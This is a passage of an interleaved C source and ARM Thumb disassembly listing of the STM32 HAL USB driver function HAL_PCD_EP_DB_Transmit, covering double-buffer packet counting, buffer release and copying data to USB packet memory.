 80030c4:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80030c8:	b29b      	uxth	r3, r3
 80030ca:	461a      	mov	r2, r3
 80030cc:	68bb      	ldr	r3, [r7, #8]
 80030ce:	781b      	ldrb	r3, [r3, #0]
 80030d0:	00db      	lsls	r3, r3, #3
 80030d2:	4413      	add	r3, r2
 80030d4:	68fa      	ldr	r2, [r7, #12]
 80030d6:	6812      	ldr	r2, [r2, #0]
 80030d8:	4413      	add	r3, r2
 80030da:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80030de:	881b      	ldrh	r3, [r3, #0]
 80030e0:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80030e4:	f8a7 3086 	strh.w	r3, [r7, #134]	; 0x86

    if (ep->xfer_len > TxPctSize)
 80030e8:	68bb      	ldr	r3, [r7, #8]
 80030ea:	699a      	ldr	r2, [r3, #24]
 80030ec:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80030f0:	429a      	cmp	r2, r3
 80030f2:	d907      	bls.n	8003104 <HAL_PCD_EP_DB_Transmit+0x5e>
    {
      ep->xfer_len -= TxPctSize;
 80030f4:	68bb      	ldr	r3, [r7, #8]
 80030f6:	699a      	ldr	r2, [r3, #24]
 80030f8:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80030fc:	1ad2      	subs	r2, r2, r3
 80030fe:	68bb      	ldr	r3, [r7, #8]
 8003100:	619a      	str	r2, [r3, #24]
 8003102:	e002      	b.n	800310a <HAL_PCD_EP_DB_Transmit+0x64>
    }
    else
    {
      ep->xfer_len = 0U;
 8003104:	68bb      	ldr	r3, [r7, #8]
 8003106:	2200      	movs	r2, #0
 8003108:	619a      	str	r2, [r3, #24]
    }

    /* Transfer is completed */
    if (ep->xfer_len == 0U)
 800310a:	68bb      	ldr	r3, [r7, #8]
 800310c:	699b      	ldr	r3, [r3, #24]
 800310e:	2b00      	cmp	r3, #0
 8003110:	f040 80b9 	bne.w	8003286 <HAL_PCD_EP_DB_Transmit+0x1e0>
    {
      PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8003114:	68bb      	ldr	r3, [r7, #8]
 8003116:	785b      	ldrb	r3, [r3, #1]
 8003118:	2b00      	cmp	r3, #0
 800311a:	d126      	bne.n	800316a <HAL_PCD_EP_DB_Transmit+0xc4>
 800311c:	68fb      	ldr	r3, [r7, #12]
 800311e:	681b      	ldr	r3, [r3, #0]
 8003120:	62fb      	str	r3, [r7, #44]	; 0x2c
 8003122:	68fb      	ldr	r3, [r7, #12]
 8003124:	681b      	ldr	r3, [r3, #0]
 8003126:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800312a:	b29b      	uxth	r3, r3
 800312c:	461a      	mov	r2, r3
 800312e:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8003130:	4413      	add	r3, r2
 8003132:	62fb      	str	r3, [r7, #44]	; 0x2c
 8003134:	68bb      	ldr	r3, [r7, #8]
 8003136:	781b      	ldrb	r3, [r3, #0]
 8003138:	00da      	lsls	r2, r3, #3
 800313a:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 800313c:	4413      	add	r3, r2
 800313e:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8003142:	62bb      	str	r3, [r7, #40]	; 0x28
 8003144:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8003146:	881b      	ldrh	r3, [r3, #0]
 8003148:	b29b      	uxth	r3, r3
 800314a:	f3c3 0309 	ubfx	r3, r3, #0, #10
 800314e:	b29a      	uxth	r2, r3
 8003150:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8003152:	801a      	strh	r2, [r3, #0]
 8003154:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8003156:	881b      	ldrh	r3, [r3, #0]
 8003158:	b29b      	uxth	r3, r3
 800315a:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800315e:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8003162:	b29a      	uxth	r2, r3
 8003164:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8003166:	801a      	strh	r2, [r3, #0]
 8003168:	e01a      	b.n	80031a0 <HAL_PCD_EP_DB_Transmit+0xfa>
 800316a:	68bb      	ldr	r3, [r7, #8]
 800316c:	785b      	ldrb	r3, [r3, #1]
 800316e:	2b01      	cmp	r3, #1
 8003170:	d116      	bne.n	80031a0 <HAL_PCD_EP_DB_Transmit+0xfa>
 8003172:	68fb      	ldr	r3, [r7, #12]
 8003174:	681b      	ldr	r3, [r3, #0]
 8003176:	637b      	str	r3, [r7, #52]	; 0x34
 8003178:	68fb      	ldr	r3, [r7, #12]
 800317a:	681b      	ldr	r3, [r3, #0]
 800317c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003180:	b29b      	uxth	r3, r3
 8003182:	461a      	mov	r2, r3
 8003184:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8003186:	4413      	add	r3, r2
 8003188:	637b      	str	r3, [r7, #52]	; 0x34
 800318a:	68bb      	ldr	r3, [r7, #8]
 800318c:	781b      	ldrb	r3, [r3, #0]
 800318e:	00da      	lsls	r2, r3, #3
 8003190:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8003192:	4413      	add	r3, r2
 8003194:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8003198:	633b      	str	r3, [r7, #48]	; 0x30
 800319a:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 800319c:	2200      	movs	r2, #0
 800319e:	801a      	strh	r2, [r3, #0]
      PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 80031a0:	68fb      	ldr	r3, [r7, #12]
 80031a2:	681b      	ldr	r3, [r3, #0]
 80031a4:	627b      	str	r3, [r7, #36]	; 0x24
 80031a6:	68bb      	ldr	r3, [r7, #8]
 80031a8:	785b      	ldrb	r3, [r3, #1]
 80031aa:	2b00      	cmp	r3, #0
 80031ac:	d126      	bne.n	80031fc <HAL_PCD_EP_DB_Transmit+0x156>
 80031ae:	68fb      	ldr	r3, [r7, #12]
 80031b0:	681b      	ldr	r3, [r3, #0]
 80031b2:	61fb      	str	r3, [r7, #28]
 80031b4:	68fb      	ldr	r3, [r7, #12]
 80031b6:	681b      	ldr	r3, [r3, #0]
 80031b8:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80031bc:	b29b      	uxth	r3, r3
 80031be:	461a      	mov	r2, r3
 80031c0:	69fb      	ldr	r3, [r7, #28]
 80031c2:	4413      	add	r3, r2
 80031c4:	61fb      	str	r3, [r7, #28]
 80031c6:	68bb      	ldr	r3, [r7, #8]
 80031c8:	781b      	ldrb	r3, [r3, #0]
 80031ca:	00da      	lsls	r2, r3, #3
 80031cc:	69fb      	ldr	r3, [r7, #28]
 80031ce:	4413      	add	r3, r2
 80031d0:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80031d4:	61bb      	str	r3, [r7, #24]
 80031d6:	69bb      	ldr	r3, [r7, #24]
 80031d8:	881b      	ldrh	r3, [r3, #0]
 80031da:	b29b      	uxth	r3, r3
 80031dc:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80031e0:	b29a      	uxth	r2, r3
 80031e2:	69bb      	ldr	r3, [r7, #24]
 80031e4:	801a      	strh	r2, [r3, #0]
 80031e6:	69bb      	ldr	r3, [r7, #24]
 80031e8:	881b      	ldrh	r3, [r3, #0]
 80031ea:	b29b      	uxth	r3, r3
 80031ec:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80031f0:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80031f4:	b29a      	uxth	r2, r3
 80031f6:	69bb      	ldr	r3, [r7, #24]
 80031f8:	801a      	strh	r2, [r3, #0]
 80031fa:	e017      	b.n	800322c <HAL_PCD_EP_DB_Transmit+0x186>
 80031fc:	68bb      	ldr	r3, [r7, #8]
 80031fe:	785b      	ldrb	r3, [r3, #1]
 8003200:	2b01      	cmp	r3, #1
 8003202:	d113      	bne.n	800322c <HAL_PCD_EP_DB_Transmit+0x186>
 8003204:	68fb      	ldr	r3, [r7, #12]
 8003206:	681b      	ldr	r3, [r3, #0]
 8003208:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800320c:	b29b      	uxth	r3, r3
 800320e:	461a      	mov	r2, r3
 8003210:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8003212:	4413      	add	r3, r2
 8003214:	627b      	str	r3, [r7, #36]	; 0x24
 8003216:	68bb      	ldr	r3, [r7, #8]
 8003218:	781b      	ldrb	r3, [r3, #0]
 800321a:	00da      	lsls	r2, r3, #3
 800321c:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800321e:	4413      	add	r3, r2
 8003220:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8003224:	623b      	str	r3, [r7, #32]
 8003226:	6a3b      	ldr	r3, [r7, #32]
 8003228:	2200      	movs	r2, #0
 800322a:	801a      	strh	r2, [r3, #0]

      /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->DataInStageCallback(hpcd, ep->num);
#else
      HAL_PCD_DataInStageCallback(hpcd, ep->num);
 800322c:	68bb      	ldr	r3, [r7, #8]
 800322e:	781b      	ldrb	r3, [r3, #0]
 8003230:	4619      	mov	r1, r3
 8003232:	68f8      	ldr	r0, [r7, #12]
 8003234:	f009 fc49 	bl	800caca <HAL_PCD_DataInStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

      if ((wEPVal & USB_EP_DTOG_RX) != 0U)
 8003238:	88fb      	ldrh	r3, [r7, #6]
 800323a:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 800323e:	2b00      	cmp	r3, #0
 8003240:	f000 82fa 	beq.w	8003838 <HAL_PCD_EP_DB_Transmit+0x792>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 8003244:	68fb      	ldr	r3, [r7, #12]
 8003246:	681b      	ldr	r3, [r3, #0]
 8003248:	461a      	mov	r2, r3
 800324a:	68bb      	ldr	r3, [r7, #8]
 800324c:	781b      	ldrb	r3, [r3, #0]
 800324e:	009b      	lsls	r3, r3, #2
 8003250:	4413      	add	r3, r2
 8003252:	881b      	ldrh	r3, [r3, #0]
 8003254:	b29b      	uxth	r3, r3
 8003256:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800325a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800325e:	82fb      	strh	r3, [r7, #22]
 8003260:	68fb      	ldr	r3, [r7, #12]
 8003262:	681b      	ldr	r3, [r3, #0]
 8003264:	461a      	mov	r2, r3
 8003266:	68bb      	ldr	r3, [r7, #8]
 8003268:	781b      	ldrb	r3, [r3, #0]
 800326a:	009b      	lsls	r3, r3, #2
 800326c:	441a      	add	r2, r3
 800326e:	8afb      	ldrh	r3, [r7, #22]
 8003270:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8003274:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8003278:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 800327c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8003280:	b29b      	uxth	r3, r3
 8003282:	8013      	strh	r3, [r2, #0]
 8003284:	e2d8      	b.n	8003838 <HAL_PCD_EP_DB_Transmit+0x792>
      }
    }
    else /* Transfer is not yet Done */
    {
      /* need to Free USB Buff */
      if ((wEPVal & USB_EP_DTOG_RX) != 0U)
 8003286:	88fb      	ldrh	r3, [r7, #6]
 8003288:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 800328c:	2b00      	cmp	r3, #0
 800328e:	d021      	beq.n	80032d4 <HAL_PCD_EP_DB_Transmit+0x22e>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 8003290:	68fb      	ldr	r3, [r7, #12]
 8003292:	681b      	ldr	r3, [r3, #0]
 8003294:	461a      	mov	r2, r3
 8003296:	68bb      	ldr	r3, [r7, #8]
 8003298:	781b      	ldrb	r3, [r3, #0]
 800329a:	009b      	lsls	r3, r3, #2
 800329c:	4413      	add	r3, r2
 800329e:	881b      	ldrh	r3, [r3, #0]
 80032a0:	b29b      	uxth	r3, r3
 80032a2:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80032a6:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80032aa:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 80032ae:	68fb      	ldr	r3, [r7, #12]
 80032b0:	681b      	ldr	r3, [r3, #0]
 80032b2:	461a      	mov	r2, r3
 80032b4:	68bb      	ldr	r3, [r7, #8]
 80032b6:	781b      	ldrb	r3, [r3, #0]
 80032b8:	009b      	lsls	r3, r3, #2
 80032ba:	441a      	add	r2, r3
 80032bc:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 80032c0:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80032c4:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80032c8:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80032cc:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80032d0:	b29b      	uxth	r3, r3
 80032d2:	8013      	strh	r3, [r2, #0]
      }

      /* Still there is data to Fill in the next Buffer */
      if (ep->xfer_fill_db == 1U)
 80032d4:	68bb      	ldr	r3, [r7, #8]
 80032d6:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 80032da:	2b01      	cmp	r3, #1
 80032dc:	f040 82ac 	bne.w	8003838 <HAL_PCD_EP_DB_Transmit+0x792>
      {
        ep->xfer_buff += TxPctSize;
 80032e0:	68bb      	ldr	r3, [r7, #8]
 80032e2:	695a      	ldr	r2, [r3, #20]
 80032e4:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80032e8:	441a      	add	r2, r3
 80032ea:	68bb      	ldr	r3, [r7, #8]
 80032ec:	615a      	str	r2, [r3, #20]
        ep->xfer_count += TxPctSize;
 80032ee:	68bb      	ldr	r3, [r7, #8]
 80032f0:	69da      	ldr	r2, [r3, #28]
 80032f2:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80032f6:	441a      	add	r2, r3
 80032f8:	68bb      	ldr	r3, [r7, #8]
 80032fa:	61da      	str	r2, [r3, #28]

        /* Calculate the len of the new buffer to fill */
        if (ep->xfer_len_db >= ep->maxpacket)
 80032fc:	68bb      	ldr	r3, [r7, #8]
 80032fe:	6a1a      	ldr	r2, [r3, #32]
 8003300:	68bb      	ldr	r3, [r7, #8]
 8003302:	691b      	ldr	r3, [r3, #16]
 8003304:	429a      	cmp	r2, r3
 8003306:	d30b      	bcc.n	8003320 <HAL_PCD_EP_DB_Transmit+0x27a>
        {
          len = ep->maxpacket;
 8003308:	68bb      	ldr	r3, [r7, #8]
 800330a:	691b      	ldr	r3, [r3, #16]
 800330c:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db -= len;
 8003310:	68bb      	ldr	r3, [r7, #8]
 8003312:	6a1a      	ldr	r2, [r3, #32]
 8003314:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003318:	1ad2      	subs	r2, r2, r3
 800331a:	68bb      	ldr	r3, [r7, #8]
 800331c:	621a      	str	r2, [r3, #32]
 800331e:	e017      	b.n	8003350 <HAL_PCD_EP_DB_Transmit+0x2aa>
        }
        else if (ep->xfer_len_db == 0U)
 8003320:	68bb      	ldr	r3, [r7, #8]
 8003322:	6a1b      	ldr	r3, [r3, #32]
 8003324:	2b00      	cmp	r3, #0
 8003326:	d108      	bne.n	800333a <HAL_PCD_EP_DB_Transmit+0x294>
        {
          len = TxPctSize;
 8003328:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 800332c:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_fill_db = 0U;
 8003330:	68bb      	ldr	r3, [r7, #8]
 8003332:	2200      	movs	r2, #0
 8003334:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
 8003338:	e00a      	b.n	8003350 <HAL_PCD_EP_DB_Transmit+0x2aa>
        }
        else
        {
          ep->xfer_fill_db = 0U;
 800333a:	68bb      	ldr	r3, [r7, #8]
 800333c:	2200      	movs	r2, #0
 800333e:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
          len = ep->xfer_len_db;
 8003342:	68bb      	ldr	r3, [r7, #8]
 8003344:	6a1b      	ldr	r3, [r3, #32]
 8003346:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db = 0U;
 800334a:	68bb      	ldr	r3, [r7, #8]
 800334c:	2200      	movs	r2, #0
 800334e:	621a      	str	r2, [r3, #32]
        }

        /* Write remaining Data to Buffer */
        /* Set the Double buffer counter for pma buffer1 */
        PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, len);
 8003350:	68bb      	ldr	r3, [r7, #8]
 8003352:	785b      	ldrb	r3, [r3, #1]
 8003354:	2b00      	cmp	r3, #0
 8003356:	d165      	bne.n	8003424 <HAL_PCD_EP_DB_Transmit+0x37e>
 8003358:	68fb      	ldr	r3, [r7, #12]
 800335a:	681b      	ldr	r3, [r3, #0]
 800335c:	63fb      	str	r3, [r7, #60]	; 0x3c
 800335e:	68fb      	ldr	r3, [r7, #12]
 8003360:	681b      	ldr	r3, [r3, #0]
 8003362:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003366:	b29b      	uxth	r3, r3
 8003368:	461a      	mov	r2, r3
 800336a:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 800336c:	4413      	add	r3, r2
 800336e:	63fb      	str	r3, [r7, #60]	; 0x3c
 8003370:	68bb      	ldr	r3, [r7, #8]
 8003372:	781b      	ldrb	r3, [r3, #0]
 8003374:	00da      	lsls	r2, r3, #3
 8003376:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8003378:	4413      	add	r3, r2
 800337a:	f203 4302 	addw	r3, r3, #1026	; 0x402
 800337e:	63bb      	str	r3, [r7, #56]	; 0x38
 8003380:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8003382:	881b      	ldrh	r3, [r3, #0]
 8003384:	b29b      	uxth	r3, r3
 8003386:	f3c3 0309 	ubfx	r3, r3, #0, #10
 800338a:	b29a      	uxth	r2, r3
 800338c:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 800338e:	801a      	strh	r2, [r3, #0]
 8003390:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003394:	2b3e      	cmp	r3, #62	; 0x3e
 8003396:	d91d      	bls.n	80033d4 <HAL_PCD_EP_DB_Transmit+0x32e>
 8003398:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800339c:	095b      	lsrs	r3, r3, #5
 800339e:	64bb      	str	r3, [r7, #72]	; 0x48
 80033a0:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80033a4:	f003 031f 	and.w	r3, r3, #31
 80033a8:	2b00      	cmp	r3, #0
 80033aa:	d102      	bne.n	80033b2 <HAL_PCD_EP_DB_Transmit+0x30c>
 80033ac:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 80033ae:	3b01      	subs	r3, #1
 80033b0:	64bb      	str	r3, [r7, #72]	; 0x48
 80033b2:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80033b4:	881b      	ldrh	r3, [r3, #0]
 80033b6:	b29a      	uxth	r2, r3
 80033b8:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 80033ba:	b29b      	uxth	r3, r3
 80033bc:	029b      	lsls	r3, r3, #10
 80033be:	b29b      	uxth	r3, r3
 80033c0:	4313      	orrs	r3, r2
 80033c2:	b29b      	uxth	r3, r3
 80033c4:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80033c8:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80033cc:	b29a      	uxth	r2, r3
 80033ce:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80033d0:	801a      	strh	r2, [r3, #0]
 80033d2:	e044      	b.n	800345e <HAL_PCD_EP_DB_Transmit+0x3b8>
 80033d4:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80033d8:	2b00      	cmp	r3, #0
 80033da:	d10a      	bne.n	80033f2 <HAL_PCD_EP_DB_Transmit+0x34c>
 80033dc:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80033de:	881b      	ldrh	r3, [r3, #0]
 80033e0:	b29b      	uxth	r3, r3
 80033e2:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80033e6:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80033ea:	b29a      	uxth	r2, r3
 80033ec:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80033ee:	801a      	strh	r2, [r3, #0]
 80033f0:	e035      	b.n	800345e <HAL_PCD_EP_DB_Transmit+0x3b8>
 80033f2:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80033f6:	085b      	lsrs	r3, r3, #1
 80033f8:	64bb      	str	r3, [r7, #72]	; 0x48
 80033fa:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80033fe:	f003 0301 	and.w	r3, r3, #1
 8003402:	2b00      	cmp	r3, #0
 8003404:	d002      	beq.n	800340c <HAL_PCD_EP_DB_Transmit+0x366>
 8003406:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8003408:	3301      	adds	r3, #1
 800340a:	64bb      	str	r3, [r7, #72]	; 0x48
 800340c:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 800340e:	881b      	ldrh	r3, [r3, #0]
 8003410:	b29a      	uxth	r2, r3
 8003412:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8003414:	b29b      	uxth	r3, r3
 8003416:	029b      	lsls	r3, r3, #10
 8003418:	b29b      	uxth	r3, r3
 800341a:	4313      	orrs	r3, r2
 800341c:	b29a      	uxth	r2, r3
 800341e:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8003420:	801a      	strh	r2, [r3, #0]
 8003422:	e01c      	b.n	800345e <HAL_PCD_EP_DB_Transmit+0x3b8>
 8003424:	68bb      	ldr	r3, [r7, #8]
 8003426:	785b      	ldrb	r3, [r3, #1]
 8003428:	2b01      	cmp	r3, #1
 800342a:	d118      	bne.n	800345e <HAL_PCD_EP_DB_Transmit+0x3b8>
 800342c:	68fb      	ldr	r3, [r7, #12]
 800342e:	681b      	ldr	r3, [r3, #0]
 8003430:	647b      	str	r3, [r7, #68]	; 0x44
 8003432:	68fb      	ldr	r3, [r7, #12]
 8003434:	681b      	ldr	r3, [r3, #0]
 8003436:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800343a:	b29b      	uxth	r3, r3
 800343c:	461a      	mov	r2, r3
 800343e:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8003440:	4413      	add	r3, r2
 8003442:	647b      	str	r3, [r7, #68]	; 0x44
 8003444:	68bb      	ldr	r3, [r7, #8]
 8003446:	781b      	ldrb	r3, [r3, #0]
 8003448:	00da      	lsls	r2, r3, #3
 800344a:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 800344c:	4413      	add	r3, r2
 800344e:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8003452:	643b      	str	r3, [r7, #64]	; 0x40
 8003454:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003458:	b29a      	uxth	r2, r3
 800345a:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 800345c:	801a      	strh	r2, [r3, #0]

        /* Copy user buffer to USB PMA */
        USB_WritePMA(hpcd->Instance, ep->xfer_buff,  ep->pmaaddr0, (uint16_t)len);
 800345e:	68fb      	ldr	r3, [r7, #12]
 8003460:	6818      	ldr	r0, [r3, #0]
 8003462:	68bb      	ldr	r3, [r7, #8]
 8003464:	6959      	ldr	r1, [r3, #20]
 8003466:	68bb      	ldr	r3, [r7, #8]
 8003468:	891a      	ldrh	r2, [r3, #8]
 800346a:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800346e:	b29b      	uxth	r3, r3
 8003470:	f005 f8c9 	bl	8008606 <USB_WritePMA>
 8003474:	e1e0      	b.n	8003838 <HAL_PCD_EP_DB_Transmit+0x792>
    }
  }
  else /* Data Buffer1 ACK received */
  {
    /* multi-packet on the NON control IN endpoint */
    TxPctSize = (uint16_t)PCD_GET_EP_DBUF1_CNT(hpcd->Instance, ep->num);
 8003476:	68fb      	ldr	r3, [r7, #12]
 8003478:	681b      	ldr	r3, [r3, #0]
 800347a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800347e:	b29b      	uxth	r3, r3
 8003480:	461a      	mov	r2, r3
 8003482:	68bb      	ldr	r3, [r7, #8]
 8003484:	781b      	ldrb	r3, [r3, #0]
 8003486:	00db      	lsls	r3, r3, #3
 8003488:	4413      	add	r3, r2
 800348a:	68fa      	ldr	r2, [r7, #12]
 800348c:	6812      	ldr	r2, [r2, #0]
 800348e:	4413      	add	r3, r2
 8003490:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8003494:	881b      	ldrh	r3, [r3, #0]
 8003496:	f3c3 0309 	ubfx	r3, r3, #0, #10
 800349a:	f8a7 3086 	strh.w	r3, [r7, #134]	; 0x86

    if (ep->xfer_len >= TxPctSize)
 800349e:	68bb      	ldr	r3, [r7, #8]
 80034a0:	699a      	ldr	r2, [r3, #24]
 80034a2:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80034a6:	429a      	cmp	r2, r3
 80034a8:	d307      	bcc.n	80034ba <HAL_PCD_EP_DB_Transmit+0x414>
    {
      ep->xfer_len -= TxPctSize;
 80034aa:	68bb      	ldr	r3, [r7, #8]
 80034ac:	699a      	ldr	r2, [r3, #24]
 80034ae:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80034b2:	1ad2      	subs	r2, r2, r3
 80034b4:	68bb      	ldr	r3, [r7, #8]
 80034b6:	619a      	str	r2, [r3, #24]
 80034b8:	e002      	b.n	80034c0 <HAL_PCD_EP_DB_Transmit+0x41a>
    }
    else
    {
      ep->xfer_len = 0U;
 80034ba:	68bb      	ldr	r3, [r7, #8]
 80034bc:	2200      	movs	r2, #0
 80034be:	619a      	str	r2, [r3, #24]
    }

    /* Transfer is completed */
    if (ep->xfer_len == 0U)
 80034c0:	68bb      	ldr	r3, [r7, #8]
 80034c2:	699b      	ldr	r3, [r3, #24]
 80034c4:	2b00      	cmp	r3, #0
 80034c6:	f040 80c0 	bne.w	800364a <HAL_PCD_EP_DB_Transmit+0x5a4>
    {
      PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 80034ca:	68bb      	ldr	r3, [r7, #8]
 80034cc:	785b      	ldrb	r3, [r3, #1]
 80034ce:	2b00      	cmp	r3, #0
 80034d0:	d126      	bne.n	8003520 <HAL_PCD_EP_DB_Transmit+0x47a>
 80034d2:	68fb      	ldr	r3, [r7, #12]
 80034d4:	681b      	ldr	r3, [r3, #0]
 80034d6:	67fb      	str	r3, [r7, #124]	; 0x7c
 80034d8:	68fb      	ldr	r3, [r7, #12]
 80034da:	681b      	ldr	r3, [r3, #0]
 80034dc:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80034e0:	b29b      	uxth	r3, r3
 80034e2:	461a      	mov	r2, r3
 80034e4:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 80034e6:	4413      	add	r3, r2
 80034e8:	67fb      	str	r3, [r7, #124]	; 0x7c
 80034ea:	68bb      	ldr	r3, [r7, #8]
 80034ec:	781b      	ldrb	r3, [r3, #0]
 80034ee:	00da      	lsls	r2, r3, #3
 80034f0:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 80034f2:	4413      	add	r3, r2
 80034f4:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80034f8:	67bb      	str	r3, [r7, #120]	; 0x78
 80034fa:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80034fc:	881b      	ldrh	r3, [r3, #0]
 80034fe:	b29b      	uxth	r3, r3
 8003500:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8003504:	b29a      	uxth	r2, r3
 8003506:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8003508:	801a      	strh	r2, [r3, #0]
 800350a:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 800350c:	881b      	ldrh	r3, [r3, #0]
 800350e:	b29b      	uxth	r3, r3
 8003510:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8003514:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8003518:	b29a      	uxth	r2, r3
 800351a:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 800351c:	801a      	strh	r2, [r3, #0]
 800351e:	e01a      	b.n	8003556 <HAL_PCD_EP_DB_Transmit+0x4b0>
 8003520:	68bb      	ldr	r3, [r7, #8]
 8003522:	785b      	ldrb	r3, [r3, #1]
 8003524:	2b01      	cmp	r3, #1
 8003526:	d116      	bne.n	8003556 <HAL_PCD_EP_DB_Transmit+0x4b0>
 8003528:	68fb      	ldr	r3, [r7, #12]
 800352a:	681b      	ldr	r3, [r3, #0]
 800352c:	667b      	str	r3, [r7, #100]	; 0x64
 800352e:	68fb      	ldr	r3, [r7, #12]
 8003530:	681b      	ldr	r3, [r3, #0]
 8003532:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003536:	b29b      	uxth	r3, r3
 8003538:	461a      	mov	r2, r3
 800353a:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 800353c:	4413      	add	r3, r2
